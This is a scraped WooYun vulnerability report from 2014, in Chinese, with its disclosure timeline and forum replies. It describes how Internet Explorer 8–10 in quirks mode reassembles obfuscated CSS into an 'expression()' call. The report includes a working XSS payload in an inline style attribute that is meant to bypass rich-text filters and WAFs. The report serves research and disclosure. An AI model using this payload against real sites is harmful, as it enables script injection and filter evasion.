{"id": 728, "wybug_id": "wooyun-2014-068564", "wybug_title": "IE CSS解析问题可致新的XSS Vectors", "wybug_corp": "微软", "wybug_author": "gainover", "wybug_date": "2014-07-15 11:32", "wybug_open_date": "2014-10-13 11:34", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-23：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-13：\t细节向公众公开  简要描述： 帮朋友研究如何绕过新浪的富文本过滤器的时候，顺带想写个小工具。写个小工具的时候，顺带发现了一个意外。发现了一个意外的时候，就发现了这个。绝B是个很奇葩的漏洞！ 详细说明：  本来是想写一个expression表达式的混淆工具。为了在expression里融入 /**/ 以及 \\ 等东西，我手工测试时遇到了下面的问题：\nfont-family:exp/**/res\\sion(alert(1))    <-- 无法正常执行font-family:e\\xp/**/ression(alert(1))    <-- 可以正常执行\n这是一个很奇怪的结果，不知道以前有人遇到过没？为什么 \\ 在 /**/ 前面就可以执行，在 /**/后面就不执行了呢？为了研究搞清楚原因，我写了以下的代码来进行测试：\n<div id=\"a\" style=\"font-family:e\\xp/**/ression(e(1))\">aa</div><div id=\"b\" style=\"font-family:exp/**/res\\sion(e(1))\">aa</div><script>\talert(document.getElementById(\"a\").style.cssText);\talert(document.getElementById(\"b\").style.cssText);</script>\n上面的代码的目的是取出IE解析之后的css内容，看看为什么会不执行了，结果比较意外：\nfont-family:e\\xp/**/ression(e(1))  --> font-family:expression(e(1)) <-正常  font-family:exp/**/res\\sion(e(1))  --> font-family:resression(e(1)) <-怪异\n你会发现后者, /**/之前的内容被忽略， \\之前的内容神奇的出现了2次。虽然很神奇，但是这个特性并不能被利用。但是，直觉告诉我，这个位置会有点什么！\n\n前面翻译过一篇mXSS的文章，其中就有关于css里一些奇葩mutation，比如单引号，双引号什么的。所以，接着我又改变了测试的代码如下：\n<div id=\"b\" style=\"font-family:exp/**/res'aaaa\\sion(e(1))\">aa</div><script>\talert(document.getElementById(\"b\").style.cssText);</script>\n注意这个单引号（后经测试，实际上其它绝大多数符号都有一样的效果），这一次又神奇了，解析后的cssText内容如下：\nfont-family:aaaares'aaaasion(e(1))\n也就是单引号之后，\\之前的内容（即：aaaa）神奇的跑到res前面了！这一次的这个特性，就感觉可以被利用了，构造以下内容\n<div id=\"b\" style=\"font-family:a/**/ression'exp\\s(e(1))\">aa</div>解析后的cssText应是：font-family:expression'exps(e(1))\n可以看到，我们的原代码里没有expression这个词汇，解析后的css中出现了expression这个单词。为了继续让expression可以被利用，我们可以继续构造：\n<div id=\"b\" style=\"font-family:a/**/ression(alert(1))('\\')exp\\')\">aa</div>解析后的cssText应是：font-family:expression(alert(1))('\\')exps') <--单引号正好\n可以看到解析后的css中alert(1)将会被执行。   漏洞证明：  保存以下代码为test.htm, IE打开\n<div id=\"b\" style=\"font-family:a/**/ression(alert(1))('\\')exp\\')\">aa</div><script>\talert(document.getElementById(\"b\").style.cssText);</script>\nIE 8，9，10 quirks mode，局限性，对于设置了doctype的网页，将无法生效，可以结合一些让页面以quirks mode加载的技巧来实现一些利用。对于一些富文本过滤器，或者WAF，可能存在绕过风险。由于代码利用中存在/**/ 和 \\，这2个东西在CSS里本身就有点“臭”，经常是被过滤的对象（一个常见的过滤方式是css里存在/**/就直接把css置空）。可以考虑结合html实体转义来配合利用。不论如何，还是很奇葩的，也许还可以利用这个特性干些其他的，也不一定~   修复方案：  很诚实的说：不知道。。   版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-07-20 08:14 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-15 11:32 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  沙发    \n     2014-07-15 11:33 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  抢我座位    \n     2014-07-15 11:34 |    \t\tredsin \t\t\t( 路人 |\t\t\t        Rank:16 漏洞数:6        )\t\t \n  坐等IE CSS解析问题可致新的XSS Vectors-2    \n     2014-07-15 11:37 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  会载入史册么？    \n     2014-07-15 11:38 |    \t\tnoob \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:18        | 向各位大神学习，向各位大神致敬)\t\t \n  占座 卖广告    \n     2014-07-15 11:39 |    \t\thkAssassin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:66        | 我是一只毛毛虫。)\t\t \n  二哥你又来了。你一来就发大招……    \n     2014-07-15 11:45 |    \t\twkc_2014 \t\t\t( 普通白帽子  |\t\t\t        Rank:164 漏洞数:45        | 2014-)\t\t \n  靠，本来能抢前排的，电脑给特么死机了    \n     2014-07-15 11:49 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  @gainover 影响IE全版本么？    \n     2014-07-15 11:52 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  前排饮料、爆米花    \n     2014-07-15 11:54 |    \t\t索马里的海贼 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:24        | http://tieba.baidu.com/f?kw=WOW)\t\t \n  安利产品了解一下？    \n     2014-07-15 12:02 |    \t\tNoxxx \t\t\t( 普通白帽子  |\t\t\t        Rank:509 漏洞数:41        )\t\t \n  小板凳 汽水    \n     2014-07-15 12:02 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  @mramydnei css里的，IE11肯定是不行咯。前面的版本，quirks文档模式触发    \n     2014-07-15 12:11 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  二哥又出来了    \n     2014-07-15 12:17 |    \t\tzhxs \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:19        | Jyhack-TeaM：http://bbs.jyhack.com/)\t\t \n  围观大神    \n     2014-07-15 12:22 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:75        | Enjoy Hacking Just Because It's Fun :)  ...)\t\t \n  后排卖301果照    \n     2014-07-15 12:31 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  @gainover = =quirks 似乎留下不少坑呢。    \n     2014-07-15 12:57 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  @gainover 那个朋友现在排在第五吧？唉，头疼    \n     2014-07-15 13:39 |    \t\t0x_Jin \t\t\t( 普通白帽子  |\t\t\t        Rank:319 漏洞数:37        | 微博：http://weibo.com/J1n9999)\t\t \n  占位 占位~    \n     2014-07-15 13:42 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  关注！    \n     2014-07-15 14:02 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  关注下~~    \n     2014-07-15 14:12 |    \t\tUndoit \t\t\t( 普通白帽子  |\t\t\t        Rank:167 漏洞数:25        | 打酱油)\t\t \n  顺带    \n     2014-07-15 14:58 |    \t\tEv1l \t\t\t( 实习白帽子  |\t\t\t        Rank:68 漏洞数:20        | 问题真实存在但影响不大。联系邮箱security...)\t\t \n  火钳刘明，我昨天还在想css能不能导致xss，今天出来了~Mark下 @基佬    \n     2014-07-15 14:59 |    \t\tEv1l \t\t\t( 实习白帽子  |\t\t\t        Rank:68 漏洞数:20        | 问题真实存在但影响不大。联系邮箱security...)\t\t \n  前排占座饮料爆米花   广告位    \n     2014-07-15 15:24 |    \t\t香草 \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:14        | javascript,xss,jsp、aspx)\t\t \n  二哥的洞期期必看    \n     2014-07-15 16:23 |    \t\tlxj616 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:90        | <hohoho>)\t\t \n  ．．．．谢．．谢．．．．．谢．谢．．．．．．．．．．谢．．谢．．．．谢．．谢．．．．．．．．．．谢．．谢．．谢．谢．谢．．．．．．．．．谢．．．．．．．．． 谢．．．．．．．谢．．．．．．．．．．．．．谢．．．．．谢．．．．．．．．．．．．．．．谢．．．谢．．．．．．．．．．．．．．．．．谢．谢．．．．．．．．．．．．．．．．．．．谢谢．．．．．．．．．．．．．．．．．．．.谢谢．．．．．∩．．．．．．．∩．．．．．.谢谢． ．．．．．．．．．．．．．．．．．．谢谢． ．．．◎．．．．U．．．．◎．．．．谢．谢．．．．．．．．．．．．．．．．．谢．．．谢谢．．．．．．．．．．．．．谢谢．．．．．．谢．谢．谢．谢．谢．谢．谢．．．．．．谢．．．．．．．．．．．．．谢．．．．．．．谢．．．．．．．．．．．．．谢．．．．．．．．谢．．．．．．．．．．．谢．．．．．    \n     2014-07-15 16:24 |    \t\tlxj616 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:90        | <hohoho>)\t\t \n  好吧 字符画乱掉了    \n     2014-07-15 16:32 |    \t\t乐乐、 \t\t\t( 普通白帽子  |\t\t\t        Rank:853 漏洞数:189        )\t\t \n  @lxj616 楼上的 你400多R 为什么是实习白帽子    \n     2014-07-15 16:37 |    \t\tlxj616 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:90        | <hohoho>)\t\t \n  @乐乐、 孩子，你还小，等你长大就明白了    \n     2014-07-15 16:48 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  mark    \n     2014-07-15 17:04 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  无影响厂商忽略（WooYun 评价 8rank）    \n     2014-07-15 17:14 |    \t\tAres \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:8        | 来自幼儿园大班)\t\t \n  你关注的白帽子 gainover 发表了漏洞 IE CSS解析问题可致新的XSS Vectors    \n     2014-07-15 17:16 |    \t\t乐乐、 \t\t\t( 普通白帽子  |\t\t\t        Rank:853 漏洞数:189        )\t\t \n  @lxj616 孩子  你被潜规则了嘛    \n     2014-07-15 17:42 |    \t\tMr .LZH \t\t\t( 普通白帽子  |\t\t\t        Rank:583 漏洞数:75        | 非妹子勿扰···)\t\t \n  这下好玩了    \n     2014-07-15 18:03 |    \t\t过客 \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:13        )\t\t \n  叼炸天    \n     2014-07-15 18:23 |    \t\t小火苗 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:1        | 我是一只小火苗呀，春风吹又生呀...)\t\t \n  微软中国会不会来认领？    \n     2014-07-15 18:44 |    \t\tMosuan \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:175        | 尘封此号，不装逼了，再见孩子们。by Mosua...)\t\t \n  @小火苗 你想多了    \n     2014-07-15 19:15 |    \t\t卡卡 \t\t\t( 普通白帽子  |\t\t\t        Rank:447 漏洞数:52        | <script>alert('安全团队长期招人')</scrip...)\t\t \n  我一打开这个界面，电脑就黑了，二哥你果然是黑客    \n     2014-07-15 19:36 |    \t\t橘子 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:3        | 呢个...羞射高中生一枚。带上大神@Haswell...)\t\t \n  占个座卖水果    \n     2014-07-15 22:30 |    \t\tStardustsky \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | ……)\t\t \n  我一打开这个界面，电脑就黑了，二哥你果然是黑客    \n     2014-07-16 22:08 |    \t\tmlyKnown \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 咚咚咚咚，查水表啦。)\t\t \n  二哥，你果然是黑客    \n     2014-07-20 11:13 |    \t\t马化腾 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:2        | 动词大呲咚呲哒呲)\t\t \n  我一打开这个界面，电脑就黑了，二哥你果然是黑客    \n     2014-07-20 14:32 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  。。。被确认了？微软入驻乌云了？    \n     2014-08-29 12:43 |    \t\tzhxs \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:19        | Jyhack-TeaM：http://bbs.jyhack.com/)\t\t \n  膜拜大牛...    \n     2014-09-02 15:13 |    \t\tLaiX \t\t\t( 普通白帽子  |\t\t\t        Rank:128 漏洞数:39        | 承接 建站、仿站、维护、反黑客、代码审计...)\t\t \n  微软确认了？？    \n     2014-09-06 22:14 |    \t\tBadCat \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:21        | 悲剧的我什么都不会)\t\t \n  @px1624 @LaiX 已交由第三方厂商(cncert国家互联网应急中心)处理    \n     2014-09-12 11:42 |    \t\t大亮 \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:65        | 慢慢挖洞)\t\t \n  本以为二哥是一个开始脱发，大腹便便的胖子，看到真人没想到那么帅    \n     2014-10-13 11:51 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  二哥厉害，ie骗我，说ie8以后就不支持expression    \n     2014-10-13 13:20 |    \t\tMARCH0 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | B-TENS)\t\t \n  生物大神    \n     2014-10-13 15:59 |    \t\t老妖 \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:3        )\t\t \n  楼主厉害    \n     2015-02-13 19:42 |    \t\t随随意意 \t\t\t( 普通白帽子  |\t\t\t        Rank:160 漏洞数:35        | 我对XSS并非真爱(┬＿┬)最近有人冒充该...)\t\t \n  额，    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}